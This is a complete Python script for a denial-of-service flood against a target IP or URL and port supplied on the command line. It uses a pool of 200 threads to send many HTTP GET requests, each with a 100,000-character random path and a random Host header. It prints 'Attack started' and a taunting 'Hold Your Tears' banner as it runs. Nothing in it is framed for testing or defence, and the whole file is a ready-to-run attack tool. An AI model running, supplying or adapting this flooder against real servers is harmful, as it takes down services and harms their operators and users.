import random
import socket
import string
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

if len(sys.argv) != 4:
    print(f"ERROR: Invalid number of arguments\nUsage: {sys.argv[0]} <Public_IP_or_URL> <Port> <Number_of_Attacks>")
    sys.exit(1)

target, port, num_requests = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])

try:
    target_ip = socket.gethostbyname(target)
except socket.gaierror:
    parsed_url = urlparse(target)
    target_ip = socket.gethostbyname(parsed_url.netloc)

payload_size = 100000 #set payload size here
large_payload = "".join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=payload_size))

def attack():
    url_path = large_payload
    custom_host_header = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ".com"
    http_request = f"GET /{url_path} HTTP/1.1\r\nHost: {custom_host_header}\r\n\r\n".encode()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as dos:
        try:
            dos.connect((target_ip, port))
            dos.send(http_request)
        except socket.error as e:
            pass

print(f"[#] Attack started on {target_ip} || Port: {port} || # Requests: {num_requests}")

with ThreadPoolExecutor(max_workers=200) as executor: #set threads here
    futures = [executor.submit(attack) for _ in range(num_requests)]
    for i, future in enumerate(futures):
        future.result()
        sys.stdout.write(f"\r[{time.strftime('%H:%M:%S')}] [{i+1}] #-#-# Hold Your Tears #-#-#")
        sys.stdout.flush()
        time.sleep(0.001) #set delay here
